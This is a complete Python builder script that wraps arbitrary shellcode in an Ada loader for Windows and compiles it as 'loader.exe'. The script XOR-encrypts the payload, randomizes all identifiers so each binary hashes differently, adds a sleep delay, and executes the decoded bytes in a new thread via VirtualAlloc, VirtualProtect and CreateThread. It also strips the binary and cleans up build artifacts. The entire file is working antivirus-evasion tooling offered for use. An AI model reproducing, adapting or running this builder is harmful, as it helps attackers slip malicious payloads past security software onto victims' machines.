#!/usr/bin/env python3
import sys
import os
import subprocess
import random
import string

def random_name(length=8):
    """Generate random identifier"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encrypt(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ ((key + i) & 0xFF))
    return bytes(result)

def format_ada(data):
    lines = []
    for i in range(0, len(data), 8):
        chunk = data[i:i+8]
        hex_vals = ", ".join(f"16#{b:02X}#" for b in chunk)
        if i + 8 < len(data):
            hex_vals += ","
        lines.append(f"      {hex_vals}")
    return "\n".join(lines)

def get_polymorphic_template(names):
    """Generate unique template with randomized names"""
    return f'''with Ada.Unchecked_Conversion;
with Interfaces;
with Interfaces.C;
with System;
with System.Storage_Elements;

procedure {names['proc']} is
   package C renames Interfaces.C;
   use type C.size_t;
   use type C.int;

   type {names['handle']} is new C.size_t;
   type {names['dword']} is new C.unsigned_long;
   type {names['sizet']} is new C.size_t;
   type {names['ptr']} is new System.Address;

   function {names['alloc']}(lpAddress: {names['ptr']}; dwSize: {names['sizet']}; 
      flAllocationType: {names['dword']}; flProtect: {names['dword']}) return {names['ptr']};
   pragma Import(Stdcall, {names['alloc']}, "VirtualAlloc");

   function {names['protect']}(lpAddress: {names['ptr']}; dwSize: {names['sizet']};
      flNewProtect: {names['dword']}; lpflOldProtect: access {names['dword']}) return C.int;
   pragma Import(Stdcall, {names['protect']}, "VirtualProtect");

   function {names['thread']}(lpThreadAttributes: {names['ptr']}; dwStackSize: {names['sizet']};
      lpStartAddress: {names['ptr']}; lpParameter: {names['ptr']}; dwCreationFlags: {names['dword']};
      lpThreadId: access {names['dword']}) return {names['handle']};
   pragma Import(Stdcall, {names['thread']}, "CreateThread");

   function {names['wait']}(hHandle: {names['handle']}; dwMilliseconds: {names['dword']}) return {names['dword']};
   pragma Import(Stdcall, {names['wait']}, "WaitForSingleObject");

   procedure {names['sleep']}(dwMilliseconds: {names['dword']});
   pragma Import(Stdcall, {names['sleep']}, "Sleep");

   type {names['byte']} is new Interfaces.Unsigned_8;
   type {names['array']} is array (Positive range <>) of {names['byte']};

   function {names['toaddr']} is new Ada.Unchecked_Conversion({names['ptr']}, System.Address);
   function {names['toptr']} is new Ada.Unchecked_Conversion(System.Address, {names['ptr']});

   procedure {names['decode']}({names['buf']}: in out {names['array']}; {names['k']}: Interfaces.Unsigned_8) is
      use Interfaces;
   begin
      for {names['i']} in {names['buf']}'Range loop
         {names['buf']}({names['i']}) := {names['buf']}({names['i']}) xor 
            {names['byte']}(({names['k']} + Unsigned_8(({names['i']} - {names['buf']}'First) mod 256)) and 16#FF#);
      end loop;
   end {names['decode']};

   {names['payload']}: {names['array']} := (
###PAYLOAD###
   );

   {names['xorkey']}: constant Interfaces.Unsigned_8 := ###KEY###;
   {names['mem']}: {names['ptr']};
   {names['oldp']}: aliased {names['dword']};
   {names['th']}: {names['handle']};
   {names['tid']}: aliased {names['dword']};

begin
   {names['sleep']}(###SLEEP###);
   {names['decode']}({names['payload']}, {names['xorkey']});

   {names['mem']} := {names['alloc']}({names['toptr']}(System.Null_Address), {names['sizet']}({names['payload']}'Length),
                       16#3000#, 16#04#);

   if {names['mem']} = {names['toptr']}(System.Null_Address) then
      return;
   end if;

   declare
      {names['dest']}: System.Address := {names['toaddr']}({names['mem']});
      use System.Storage_Elements;
      type {names['bptr']} is access all {names['byte']};
      function {names['conv']} is new Ada.Unchecked_Conversion(System.Address, {names['bptr']});
   begin
      for {names['idx']} in {names['payload']}'Range loop
         {names['conv']}({names['dest']}).all := {names['payload']}({names['idx']});
         {names['dest']} := {names['dest']} + 1;
      end loop;
   end;

   if {names['protect']}({names['mem']}, {names['sizet']}({names['payload']}'Length), 16#20#, {names['oldp']}'Access) = 0 then
      return;
   end if;

   {names['th']} := {names['thread']}({names['toptr']}(System.Null_Address), 0, {names['mem']}, 
                          {names['toptr']}(System.Null_Address), 0, {names['tid']}'Access);

   if {names['th']} /= 0 then
      declare
         {names['res']}: constant {names['dword']} := {names['wait']}({names['th']}, 16#FFFFFFFF#);
      begin
         null;
      end;
   end if;
end {names['proc']};'''

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 build.py <shellcode.bin>")
        sys.exit(1)
    
    shellcode_file = sys.argv[1]
    
    if not os.path.exists(shellcode_file):
        print(f"Error: {shellcode_file} not found")
        sys.exit(1)
    
    # Generate unique names for polymorphism
    names = {
        'proc': random_name(),
        'handle': random_name(),
        'dword': random_name(),
        'sizet': random_name(),
        'ptr': random_name(),
        'alloc': random_name(),
        'protect': random_name(),
        'thread': random_name(),
        'wait': random_name(),
        'sleep': random_name(),
        'byte': random_name(),
        'array': random_name(),
        'toaddr': random_name(),
        'toptr': random_name(),
        'decode': random_name(),
        'buf': random_name(),
        'k': random_name(),
        'i': random_name(),
        'payload': random_name(),
        'xorkey': random_name(),
        'mem': random_name(),
        'oldp': random_name(),
        'th': random_name(),
        'tid': random_name(),
        'dest': random_name(),
        'bptr': random_name(),
        'conv': random_name(),
        'idx': random_name(),
        'res': random_name()
    }
    
    print(f"[*] Loading shellcode from {shellcode_file}")
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    print(f"[*] Loaded {len(shellcode)} bytes")
    
    xor_key = random.randint(1, 255)
    sleep_ms = random.randint(500, 2000)
    
    print(f"[*] Encrypting with XOR key: 0x{xor_key:02X}")
    print(f"[*] Random sleep delay: {sleep_ms}ms")
    print(f"[*] Generating polymorphic source ({len(names)} unique identifiers)")
    
    encrypted = xor_encrypt(shellcode, xor_key)
    
    source = get_polymorphic_template(names)
    source = source.replace("###PAYLOAD###", format_ada(encrypted))
    source = source.replace("###KEY###", str(xor_key))
    source = source.replace("###SLEEP###", str(sleep_ms))
    
    filename = f"{names['proc'].lower()}.adb"
    with open(filename, 'w') as f:
        f.write(source)
    
    print(f"[*] Compiling {filename}...")
    result = subprocess.run(
        ['x86_64-w64-mingw32-gnatmake', '-O2', filename, 
         '-largs', '-mwindows', '-lkernel32'],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print(f"[!] Compilation failed:\n{result.stderr}")
        sys.exit(1)
    
    exe_name = f"{names['proc'].lower()}.exe"
    final_name = "loader.exe"
    
    print("[*] Stripping binary")
    subprocess.run(['x86_64-w64-mingw32-strip', '--strip-all', exe_name],
                   capture_output=True)
    
    if os.path.exists(final_name):
        os.remove(final_name)
    os.rename(exe_name, final_name)
    
    for ext in ['.ali', '.o', '.adb']:
        f = names['proc'].lower() + ext
        if os.path.exists(f):
            os.remove(f)
    
    size = os.path.getsize(final_name)
    print(f"[+] Success: {final_name} ({size:,} bytes)")
    print(f"[+] Binary is unique - hash will never match previous builds")

if __name__ == "__main__":
    main()
